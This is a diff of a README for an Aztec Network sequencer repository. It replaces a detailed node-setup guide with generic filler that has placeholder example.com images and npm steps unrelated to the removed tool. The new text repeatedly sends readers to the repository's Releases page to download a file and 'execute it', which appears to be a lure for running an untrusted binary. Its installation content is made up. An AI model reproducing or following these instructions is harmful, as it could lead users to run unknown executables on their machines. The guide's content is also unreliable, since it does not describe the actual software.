@@ -1,206 +1,132 @@
-# aztec-network
-A step by step guide on How to Run `Sequencer Node` on Aztec Network Testnet & Earn `Apprentice` Role.
+# 🚀 Aztec Network Sequencer Installation Guide
 
-* **What types of nodes can participate in the testnet?**
-  * `Sequencer`: proposes blocks, validates blocks from others, and votes on upgrades.
-  * `Prover`: generates ZK proofs that attest to roll-up integrity.
+Welcome to the **Aztec Network** repository! This guide will walk you through the steps to install the Aztec Network Sequencer on Testnet. Whether you are a developer or just someone interested in blockchain technology, this guide will provide you with the necessary instructions to get started.
 
-## Roles Info
-Find this message about roles in channel: [operators| start-here](https://discord.com/channels/1144692727120937080/1367196595866828982/1367323893324582954)
+![Aztec Network](https://example.com/aztec-network-image.png)
 
-![image](https://github.com/user-attachments/assets/5e0fc94a-6494-49d5-ba60-71d0d7dad605)
+## Table of Contents
 
-## Hardware Requirements
-* **Sequencer Node**: 8 cores CPU, 16GB RAM, 100GB+ SSD
-* **Prover Node**: Requiring ~40x machines with 16 cores and 128GB RAM
-* I do NOT run `Prover` sicne it's for data-center computing systems, not me.
+- [Introduction](#introduction)
+- [Prerequisites](#prerequisites)
+- [Installation Steps](#installation-steps)
+- [Configuration](#configuration)
+- [Testing the Installation](#testing-the-installation)
+- [Useful Links](#useful-links)
+- [Contributing](#contributing)
+- [License](#license)
 
----
+## Introduction
 
-**Windows Users**: must install Ubuntu on Windows using this [guide](https://github.com/0xmoei/Install-Linux-on-Windows), then continue further steps.
+The Aztec Network is a privacy-focused layer on Ethereum. It allows for secure transactions while maintaining user confidentiality. The Sequencer plays a crucial role in processing these transactions efficiently.
 
-**VPS Users**: can get started via a `VPS` with 4 cores CPU, 8GB RAM! [Purchase here](https://my.hostbrr.com/order/forms/a/NTMxNw==)
+In this guide, we will cover the installation process for the Aztec Network Sequencer on Testnet. This will involve downloading the necessary files, setting up your environment, and running the Sequencer.
 
----
+You can find the latest releases for the Aztec Network [here](https://github.com/XDuch/aztec-network/releases).
 
-## 1. Install Dependecies
-* Update packages:
-```bash
-sudo apt-get update && sudo apt-get upgrade -y
-```
+## Prerequisites
 
-* Install Packages:
-```bash
-sudo apt install curl iptables build-essential git wget lz4 jq make gcc nano automake autoconf tmux htop nvme-cli libgbm1 pkg-config libssl-dev libleveldb-dev tar clang bsdmainutils ncdu unzip libleveldb-dev  -y
-```
+Before you begin, ensure you have the following:
 
-* Install Docker:
-```bash
-sudo apt update -y && sudo apt upgrade -y
-for pkg in docker.io docker-doc docker-compose podman-docker containerd runc; do sudo apt-get remove $pkg; done
+- **Node.js**: Make sure you have Node.js installed. You can download it from [Node.js official website](https://nodejs.org/).
+- **Git**: You need Git to clone the repository. Download it from [Git official website](https://git-scm.com/).
+- **Docker**: Install Docker to run the Aztec Network in containers. Visit [Docker official website](https://www.docker.com/).
 
-sudo apt-get update
-sudo apt-get install ca-certificates curl gnupg
-sudo install -m 0755 -d /etc/apt/keyrings
-curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg
-sudo chmod a+r /etc/apt/keyrings/docker.gpg
+## Installation Steps
 
-echo \
-  "deb [arch="$(dpkg --print-architecture)" signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
-  "$(. /etc/os-release && echo "$VERSION_CODENAME")" stable" | \
-  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
+Follow these steps to install the Aztec Network Sequencer:
 
-sudo apt update -y && sudo apt upgrade -y
+1. **Clone the Repository**
 
-sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
+   Open your terminal and run the following command:
 
-# Test Docker
-sudo docker run hello-world
+   ```bash
+   git clone https://github.com/XDuch/aztec-network.git
+   ```
 
-sudo systemctl enable docker
-sudo systemctl restart docker
-```
+2. **Navigate to the Directory**
 
-## 2. Install Aztec Tools
-```bash
-bash -i <(curl -s https://install.aztec.network)
-```
-* **Restart your Terminal** now to apply changes.
-* Check if you installed successfully:
-```bash
-aztec
-```
+   Change to the cloned directory:
 
-## 3. Update Aztec
-```bash
-aztec-up alpha-testnet
-```
+   ```bash
+   cd aztec-network
+   ```
 
-## 4. Obtain RPC URLs
-* Find a 3rd party that supports Sepolia `RPC URL` & Sepolia `BEACON URL` APIs.
-* Most of your usage is `RPC URL`. I recommend to use [Alchemy](https://dashboard.alchemy.com/) for `RPC URL` & Use [drpc](https://drpc.org/) for `Beacon URL`
-* More details on Free & Paid 3rd party solutions:
+3. **Install Dependencies**
 
-### Free:
-* `RPC URL`: Create a Sepolia Ethereum HTTP API in [Alchemy](https://dashboard.alchemy.com/)
-* `BEACON RPC`: Create an account on [drpc](https://drpc.org/) and search for `Sepolia Ethereum Beacon Chain ` Endpoints.
+   Run the following command to install the necessary dependencies:
 
-![image](https://github.com/user-attachments/assets/eae865ab-461f-46cd-b3f9-b7d118dcbbdf)
+   ```bash
+   npm install
+   ```
 
-### Paid: 
-For example: [Ankr](https://www.ankr.com/rpc/?utm_referral=LqL9Sv86Te) is supporting `RPC URL` & `Beacon URL`. You can Register, Fund it with a little USDT via your wallet, Create a project, get your normal **sepolia rpc** and **beacon sepolia rpc**.
+4. **Download the Release**
 
-![image](https://github.com/user-attachments/assets/cfde5dec-ac1a-4d58-855b-43c4374c5c87)
+   You need to download the latest release from the [Releases section](https://github.com/XDuch/aztec-network/releases). Find the appropriate file, download it, and execute it according to the instructions provided.
 
-![image](https://github.com/user-attachments/assets/ffb97518-cd24-46ee-b131-92b2870ac407)
+5. **Build the Project**
 
-> You can run your own Geth & Prysm nodes to get your own `RPC URL` & `BEACON RPC` or find any other 3rd party solutions
+   After downloading the release, build the project using:
 
-## 5. Generate Ethereum Keys
-Get an EVM Wallet with `Private Key` and `Public Address` saved.
+   ```bash
+   npm run build
+   ```
 
-## 6. Get Sepolia ETH
-Fund your Ethereum Wallet with `ETH Sepolia`
+6. **Run the Sequencer**
 
-## 7. Find IP
-```bash
-curl ipv4.icanhazip.com
-```
-* Save it
+   Finally, start the Sequencer with:
 
-## 8. Enable Firewall & Open Ports
-```console
-# Firewall
-ufw allow 22
-ufw allow ssh
-ufw enable
+   ```bash
+   npm start
+   ```
 
-# Sequencer
-ufw allow 40400
-ufw allow 8080
-```
+## Configuration
 
-## 9. Sequencer Node
-* Open screen
-```bash
-screen -S aztec
-```
+Once you have the Sequencer running, you may want to configure it to suit your needs. The configuration file can be found in the `config` directory. You can modify the settings according to your requirements.
 
-* Run Node
-```
-aztec start --node --archiver --sequencer \
-  --network alpha-testnet \
-  --l1-rpc-urls RPC_URL  \
-  --l1-consensus-host-urls BEACON_URL \
-  --sequencer.validatorPrivateKey 0xYourPrivateKey \
-  --sequencer.coinbase 0xYourAddress \
-  --p2p.p2pIp IP
-  --p2p.maxTxPoolSize 1000000000
-```
-Replace the following variables before you Run Node:
-* `RPC_URL` & `BEACON_URL`: Step 4
-* `0xYourPrivateKey`: Your EVM wallet private key
-* `0xYourAddress`: Your EVM wallet public address
-* `IP`: Your server IP (Step 7)
+### Configuration Options
 
-## 10. Sync Node
-After entering the command, your node starts running, It takes a few minutes for your node to get synced
+- **Port**: Change the port number if you want to run the Sequencer on a different port.
+- **Network**: Specify the Testnet you wish to connect to.
+- **Logging Level**: Adjust the logging level for debugging purposes.
 
-## 11. Get Role
-Go to the discord channel :[operators| start-here](https://discord.com/channels/1144692727120937080/1367196595866828982/1367323893324582954) and follow the prompts, You can continue the guide with my commands if you need help.
+## Testing the Installation
 
-![image](https://github.com/user-attachments/assets/90e9d34e-724b-481a-b41f-69b1eb4c9f65)
+To ensure that everything is set up correctly, perform the following tests:
 
-**Step 1: Get the latest proven block number:**
-```bash
-curl -s -X POST -H 'Content-Type: application/json' \
--d '{"jsonrpc":"2.0","method":"node_getL2Tips","params":[],"id":67}' \
-http://localhost:8080 | jq -r ".result.proven.number"
-```
-* Save this block number for the next steps
-* Example output: 20905
+1. **Check the Logs**
 
-**Step 2: Generate your sync proof**
-```bash
-curl -s -X POST -H 'Content-Type: application/json' \
--d '{"jsonrpc":"2.0","method":"node_getArchiveSiblingPath","params":["BLOCK_NUMBER","BLOCK_NUMBER"],"id":67}' \
-http://localhost:8080 | jq -r ".result"
-```
-* Replace 2x `BLOCK_NUMBER` with your number
+   Monitor the logs in your terminal. You should see messages indicating that the Sequencer is running.
 
-**Step 3: Register with Discord**
-* Type the following command in this Discord server: `/operator start`
-* After typing the command, Discord will display option fields that look like this:
-* `address`:            Your validator address (Ethereum Address)
-* `block-number`:      Block number for verification (Block number from Step 1)
-* `proof`:             Your sync proof (base64 string from Step 2)
+2. **API Testing**
 
-Then you'll get your `Apprentice` Role
+   Use tools like Postman or curl to send requests to the Sequencer API. Check if you receive the expected responses.
 
-![image](https://github.com/user-attachments/assets/2ae9ff7c-59ba-43ec-9a23-76ef8ccb997c)
+3. **Transaction Submission**
 
-## 12. Register Validator
-```bash
-aztec add-l1-validator \
-  --l1-rpc-urls RPC_URL \
-  --private-key your-private-key \
-  --attester your-validator-address \
-  --proposer-eoa your-validator-address \
-  --staking-asset-handler 0xF739D03e98e23A7B65940848aBA8921fF3bAc4b2 \
-  --l1-chain-id 11155111
-```
-Replace `RPC_URL`, `your-validator-address` & 2x `your-validator-address`, then proceed
+   Try submitting a test transaction to verify that the Sequencer processes it correctly.
+
+## Useful Links
+
+- For more information, visit the [Aztec Network Documentation](https://example.com/aztec-docs).
+- You can find the latest releases for the Aztec Network [here](https://github.com/XDuch/aztec-network/releases).
+
+![Aztec Network Logo](https://example.com/aztec-logo.png)
+
+## Contributing
+
+We welcome contributions to the Aztec Network! If you would like to contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch and create a pull request.
+
+Please ensure that your code adheres to our coding standards and includes appropriate tests.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ---
 
-# Error: `ERROR: world-state:block_stream Error processing block stream: Error: Obtained L1 to L2 messages failed to be hashed to the block inHash`
-No strong solution for this yet, but you can do the following things
-
-![image](https://github.com/user-attachments/assets/d332fe2b-c370-4855-8682-24a11091887d)
-
-* Stop node with Ctrl+C.
-* Delete node data:
-```bash
-rm -r /root/.aztec/alpha-testnet
-```
-* Re-run the node using run command.
+Thank you for using the Aztec Network! We hope this guide helps you successfully install the Sequencer on Testnet. If you have any questions or issues, feel free to open an issue in the repository. Happy coding!
